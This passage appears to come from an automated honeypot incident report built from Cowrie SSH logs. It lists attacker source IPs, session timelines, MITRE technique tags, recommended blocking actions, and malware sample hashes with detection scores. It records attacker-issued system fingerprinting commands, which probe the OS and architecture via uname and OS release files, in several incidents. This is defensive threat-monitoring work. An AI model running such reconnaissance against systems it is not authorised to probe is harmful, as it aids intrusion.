| `2026-08-15 04:44:44` | `cowrie.command.input` |
| `2026-08-15 04:44:44` | `cowrie.command.input` |
| `2026-08-15 04:44:44` | `cowrie.command.input` |
| `2026-08-15 04:44:44` | `cowrie.command.input` |
| `2026-08-15 04:44:44` | `cowrie.log.closed` |
| `2026-08-15 04:44:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5041c01f123e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-15 04:46 |
| **Last Seen** | 2026-08-15 04:46 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 04:46:40` | `cowrie.session.connect` |
| `2026-08-15 04:46:40` | `cowrie.client.version` |
| `2026-08-15 04:46:40` | `cowrie.client.kex` |
| `2026-08-15 04:46:41` | `cowrie.login.success` |
| `2026-08-15 04:46:43` | `cowrie.session.params` |
| `2026-08-15 04:46:43` | `cowrie.command.input` |
| `2026-08-15 04:46:43` | `cowrie.command.input` |
| `2026-08-15 04:46:43` | `cowrie.command.input` |
| `2026-08-15 04:46:43` | `cowrie.command.input` |
| `2026-08-15 04:46:43` | `cowrie.command.input` |
| `2026-08-15 04:46:43` | `cowrie.command.success` |
| `2026-08-15 04:46:43` | `cowrie.command.input` |
| `2026-08-15 04:46:43` | `cowrie.command.input` |
| `2026-08-15 04:46:43` | `cowrie.command.input` |
| `2026-08-15 04:46:43` | `cowrie.command.input` |
| `2026-08-15 04:46:43` | `cowrie.log.closed` |
| `2026-08-15 04:46:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-addadc699f9f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-15 04:48 |
| **Last Seen** | 2026-08-15 04:48 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 04:48:36` | `cowrie.session.connect` |
| `2026-08-15 04:48:36` | `cowrie.client.version` |
| `2026-08-15 04:48:36` | `cowrie.client.kex` |
| `2026-08-15 04:48:38` | `cowrie.login.success` |
| `2026-08-15 04:48:39` | `cowrie.session.params` |
| `2026-08-15 04:48:39` | `cowrie.command.input` |
| `2026-08-15 04:48:39` | `cowrie.command.input` |
| `2026-08-15 04:48:39` | `cowrie.command.input` |
| `2026-08-15 04:48:39` | `cowrie.command.input` |
| `2026-08-15 04:48:39` | `cowrie.command.input` |
| `2026-08-15 04:48:39` | `cowrie.command.success` |
| `2026-08-15 04:48:39` | `cowrie.command.input` |
| `2026-08-15 04:48:39` | `cowrie.command.input` |
| `2026-08-15 04:48:39` | `cowrie.command.input` |
| `2026-08-15 04:48:39` | `cowrie.command.input` |
| `2026-08-15 04:48:39` | `cowrie.log.closed` |
| `2026-08-15 04:48:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94722a17061e

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-15 04:49 |
| **Last Seen** | 2026-08-15 04:49 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 04:49:49` | `cowrie.session.connect` |
| `2026-08-15 04:49:49` | `cowrie.client.version` |
| `2026-08-15 04:49:49` | `cowrie.client.kex` |
| `2026-08-15 04:49:50` | `cowrie.login.success` |
| `2026-08-15 04:49:51` | `cowrie.session.params` |
| `2026-08-15 04:49:51` | `cowrie.command.input` |
| `2026-08-15 04:49:51` | `cowrie.log.closed` |
| `2026-08-15 04:49:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59bc6652fe06

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-15 04:50 |
| **Last Seen** | 2026-08-15 04:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 04:50:39` | `cowrie.session.connect` |
| `2026-08-15 04:50:40` | `cowrie.client.version` |
| `2026-08-15 04:50:40` | `cowrie.client.kex` |
| `2026-08-15 04:50:41` | `cowrie.login.success` |
| `2026-08-15 04:50:42` | `cowrie.session.params` |
| `2026-08-15 04:50:42` | `cowrie.command.input` |
| `2026-08-15 04:50:42` | `cowrie.command.input` |
| `2026-08-15 04:50:42` | `cowrie.command.input` |
| `2026-08-15 04:50:42` | `cowrie.command.input` |
| `2026-08-15 04:50:42` | `cowrie.command.input` |
| `2026-08-15 04:50:42` | `cowrie.command.success` |
| `2026-08-15 04:50:42` | `cowrie.command.input` |
| `2026-08-15 04:50:42` | `cowrie.command.input` |
| `2026-08-15 04:50:42` | `cowrie.command.input` |
| `2026-08-15 04:50:42` | `cowrie.command.input` |
| `2026-08-15 04:50:42` | `cowrie.log.closed` |
| `2026-08-15 04:50:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70de603412b2

| Field | Detail |
|---|---|
| **Source IP** | `111.70.23[.]238` |
| **First Seen** | 2026-08-15 04:51 |
| **Last Seen** | 2026-08-15 04:51 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 04:51:12` | `cowrie.session.connect` |
| `2026-08-15 04:51:12` | `cowrie.client.version` |
| `2026-08-15 04:51:13` | `cowrie.client.kex` |
| `2026-08-15 04:51:15` | `cowrie.login.success` |
| `2026-08-15 04:51:16` | `cowrie.direct-tcpip.request` |
| `2026-08-15 04:51:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.23[.]238` to AbuseIPDB if not already reported
- [ ] Block `111.70.23[.]238` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8db8c40f23c

| Field | Detail |
|---|---|
| **Source IP** | `101.13.5[.]49` |
| **First Seen** | 2026-08-15 04:51 |
| **Last Seen** | 2026-08-15 04:51 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 04:51:22` | `cowrie.session.connect` |
| `2026-08-15 04:51:23` | `cowrie.client.version` |
| `2026-08-15 04:51:23` | `cowrie.client.kex` |
| `2026-08-15 04:51:25` | `cowrie.login.success` |
| `2026-08-15 04:51:26` | `cowrie.direct-tcpip.request` |
| `2026-08-15 04:51:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.13.5[.]49` to AbuseIPDB if not already reported
- [ ] Block `101.13.5[.]49` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-046de1a3cf8c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-15 04:52 |
| **Last Seen** | 2026-08-15 04:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 04:52:49` | `cowrie.session.connect` |
| `2026-08-15 04:52:49` | `cowrie.client.version` |
| `2026-08-15 04:52:50` | `cowrie.client.kex` |
| `2026-08-15 04:52:50` | `cowrie.login.success` |
| `2026-08-15 04:52:51` | `cowrie.session.params` |
| `2026-08-15 04:52:51` | `cowrie.command.input` |
| `2026-08-15 04:52:51` | `cowrie.command.input` |
| `2026-08-15 04:52:51` | `cowrie.command.input` |
| `2026-08-15 04:52:51` | `cowrie.command.input` |
| `2026-08-15 04:52:51` | `cowrie.command.input` |
| `2026-08-15 04:52:51` | `cowrie.command.success` |
| `2026-08-15 04:52:51` | `cowrie.command.input` |
| `2026-08-15 04:52:51` | `cowrie.command.input` |
| `2026-08-15 04:52:51` | `cowrie.command.input` |
| `2026-08-15 04:52:51` | `cowrie.command.input` |
| `2026-08-15 04:52:51` | `cowrie.log.closed` |
| `2026-08-15 04:52:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-089726a381aa

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-15 04:55 |
| **Last Seen** | 2026-08-15 04:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 04:55:01` | `cowrie.session.connect` |
| `2026-08-15 04:55:01` | `cowrie.client.version` |
| `2026-08-15 04:55:01` | `cowrie.client.kex` |
| `2026-08-15 04:55:02` | `cowrie.login.success` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `80.251.153[.]178` | **3368** | 2026-08-15 02:55 | 2026-08-15 04:55 | 3929m | 0 | `T1592` | 🟠 MEDIUM |
| `14.103.114[.]244` | **15** | 2026-08-15 02:58 | 2026-08-15 04:18 | 26m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **5** | 2026-08-15 02:57 | 2026-08-15 04:41 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]204` | **5** | 2026-08-15 04:51 | 2026-08-15 04:52 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]121` | **3** | 2026-08-15 03:42 | 2026-08-15 03:42 | 0m | 0 | `T1592` | 🟢 LOW |
| `210.16.100[.]120` | **3** | 2026-08-15 04:48 | 2026-08-15 04:49 | 1m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]190` | **3** | 2026-08-15 04:50 | 2026-08-15 04:50 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]170` | **3** | 2026-08-15 04:50 | 2026-08-15 04:51 | 0m | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]124` | **3** | 2026-08-15 03:57 | 2026-08-15 03:57 | 0m | 0 | `T1592` | 🟢 LOW |
| `91.233.83[.]203` | **3** | 2026-08-15 03:37 | 2026-08-15 04:54 | 3m | 0 | `T1592` | 🟢 LOW |
| `91.209.11[.]175` | **2** | 2026-08-15 03:51 | 2026-08-15 03:52 | 0m | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]14` | **2** | 2026-08-15 04:00 | 2026-08-15 04:16 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.203.57[.]11` | 1 | 2026-08-15 04:43 | 2026-08-15 04:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `107.150.146[.]69` | 1 | 2026-08-15 04:54 | 2026-08-15 04:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `153.37.177[.]219` | 1 | 2026-08-15 03:49 | 2026-08-15 03:51 | 120s | 0 | `T1592` | 🟢 LOW |
| `176.10.203[.]54` | 1 | 2026-08-15 03:10 | 2026-08-15 03:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `177.12.235[.]145` | 1 | 2026-08-15 04:06 | 2026-08-15 04:06 | 10s | 0 | `T1592` | 🟢 LOW |
| `181.225.32[.]49` | 1 | 2026-08-15 03:56 | 2026-08-15 03:56 | 11s | 0 | `T1592` | 🟢 LOW |
| `193.176.31[.]251` | 1 | 2026-08-15 04:22 | 2026-08-15 04:22 | 0s | 0 | `T1592` | 🟢 LOW |
| `194.195.210[.]47` | 1 | 2026-08-15 03:35 | 2026-08-15 03:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.206.182[.]219` | 1 | 2026-08-15 04:21 | 2026-08-15 04:21 | 0s | 0 | `T1592` | 🟢 LOW |
| `197.1.149[.]135` | 1 | 2026-08-15 04:23 | 2026-08-15 04:23 | 11s | 0 | `T1592` | 🟢 LOW |
| `220.180.166[.]214` | 1 | 2026-08-15 04:41 | 2026-08-15 04:41 | 21s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]157` | 1 | 2026-08-15 04:07 | 2026-08-15 04:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.182.192[.]221` | 1 | 2026-08-15 03:03 | 2026-08-15 03:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.91.64[.]6` | 1 | 2026-08-15 03:40 | 2026-08-15 03:40 | 31s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]17` | 1 | 2026-08-15 04:18 | 2026-08-15 04:18 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]198` | 1 | 2026-08-15 04:40 | 2026-08-15 04:40 | 4s | 0 | `T1592` | 🟢 LOW |
| `78.66.44[.]246` | 1 | 2026-08-15 04:33 | 2026-08-15 04:35 | 120s | 0 | `T1592` | 🟢 LOW |
| `78.66.45[.]101` | 1 | 2026-08-15 03:48 | 2026-08-15 03:50 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 81/100 | 🔴 HIGH | **28/75** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 41/100 | 🟡 MEDIUM | **29/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **23/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
